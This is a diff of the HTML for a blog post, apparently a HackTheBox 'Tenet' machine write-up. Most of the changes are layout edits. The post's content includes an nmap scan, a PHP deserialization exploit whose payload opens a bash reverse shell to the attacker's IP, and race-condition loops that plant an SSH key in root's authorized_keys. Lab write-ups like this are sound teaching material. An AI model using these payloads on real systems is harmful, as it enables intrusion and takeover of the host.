@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;309  10.10.10.223                                                                                                              端口扫描常规22和80: 1234567">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;309  10.10.10.223   端口扫描常规22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.10.223Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-01-18 10:48">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Tenet - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/01/18/Tenet-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;309  10.10.10.223                                                                                                              端口扫描常规22和80: 1234567">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;309  10.10.10.223   端口扫描常规22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.10.223Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-01-18 10:48">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011801.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011802.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011803.jpg">
@@ -120,8 +120,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -143,7 +150,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -211,56 +218,21 @@
 </li>
 <li><h2 id="10-10-10-223"><a href="#10-10-10-223" class="headerlink" title="10.10.10.223"></a>10.10.10.223</h2></li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011801.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011801.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>常规22和80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.223</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-18 10:48 CST</span><br><span class="line">Nmap scan report for 10.10.10.223</span><br><span class="line">Host is up (0.074s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)</span><br><span class="line">|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)</span><br><span class="line">|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 26.02 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>直接ip访问是apache默认页面，把tenet.htb加hosts：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011802.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011802.jpg" alt=""></p>
 <p>是一个wordpress，在一个评论里提示sator php backup，这是子域名，同样加hosts：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011803.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011803.jpg" alt=""></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.223 tenet.htb sator.tenet.htb</span><br></pre></td></tr></table></figure>
 
 <p>##sator.tenet.htb</p>
 <p>直接访问是apache默认页面，根据前面的提示信息，很容易得到bak文件备份：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011804.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011804.jpg" alt=""></p>
 <h1 id="php-反序列化"><a href="#php-反序列化" class="headerlink" title="php 反序列化"></a>php 反序列化</h1><p>查看sator代码，很明显是php反序列化：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011805.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011805.jpg" alt=""></p>
 <ul>
 <li>Exploiting PHP deserialization. Intro to PHP object injection… | by Vickie Li | The Startup | Medium<br><a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a" target="_blank" rel="noopener">https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a</a></li>
 <li><a href="https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf</a></li>
@@ -268,14 +240,7 @@
 <h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>那就是直接利用反序列化写php文件，触发reverse shell：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php exp.php</span><br><span class="line"></span><br><span class="line">python3 -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011806.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011806.jpg" alt=""></p>
 <h2 id="exp-php"><a href="#exp-php" class="headerlink" title="exp.php"></a>exp.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DatabaseExport</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $user_file = <span class="string">'test.php'</span>;</span><br><span class="line">        <span class="keyword">public</span> $data = <span class="string">'&lt;?php exec("/bin/bash -c \'bash -i &gt; /dev/tcp/10.10.14.11/4445 0&gt;&amp;1\'"); ?&gt;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                file_put_contents(<span class="keyword">__DIR__</span> . <span class="string">'/'</span> . <span class="keyword">$this</span> -&gt;user_file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'[] Database updated'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = <span class="string">'http://10.10.10.223/sator.php?arepo='</span> . urlencode(serialize(<span class="keyword">new</span> DatabaseExport));</span><br><span class="line">$response = file_get_contents(<span class="string">"$url"</span>);</span><br><span class="line">$response = file_get_contents(<span class="string">"http://10.10.10.223/test.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>然后就在wordpress/wp-config.php里得到mysql用户名密码：</p>
@@ -283,41 +248,13 @@
 
 <p>这也就直接是ssh用户名密码</p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>直接ssh登录，读取user.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011807.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011807.jpg" alt=""></p>
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><p>sudo -l可以看到当前用户可以sudo运行/usr/local/bin/enableSSH.sh：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011808.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011808.jpg" alt=""></p>
 <p>查看这个文件，里面addkey就是把/tmp/ssh-XXXXXXXX复制写入到/root/.ssh/authorized_keys，那么可以考虑做条件竞争，把我们自己的公钥写到/tmp/ssh-XXXXXXXX，从而使其复制写入到/root/.ssh/authorized_keys：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011809.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011809.jpg" alt=""></p>
 <h1 id="条件竞争-amp-amp-root-flag"><a href="#条件竞争-amp-amp-root-flag" class="headerlink" title="条件竞争 &amp;&amp; root flag"></a>条件竞争 &amp;&amp; root flag</h1><p>就是两个脚本，一个写入公钥到tmp，一个sudo调用enableSSH.sh，竞争成功即可root登录，得到root.txt：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011810.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021011810.jpg" alt=""></p>
 <h2 id="add-rsa-sh"><a href="#add-rsa-sh" class="headerlink" title="add_rsa.sh"></a>add_rsa.sh</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ssh-rsa key"</span> | tee /tmp/ssh-*</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="1-sh"><a href="#1-sh" class="headerlink" title="1.sh"></a>1.sh</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">sudo /usr/<span class="built_in">local</span>/bin/enableSSH.sh</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
@@ -337,7 +274,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2021-06-15T07:27:49.164Z" itemprop="dateUpdated">2021-06-15 15:27:49</time>
+    Last updated: <time datetime="2021-06-15T07:27:49.164Z" itemprop="dateUpdated">2021-06-15 15:27:49</time>
 </span><br>
 
 
@@ -504,11 +441,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
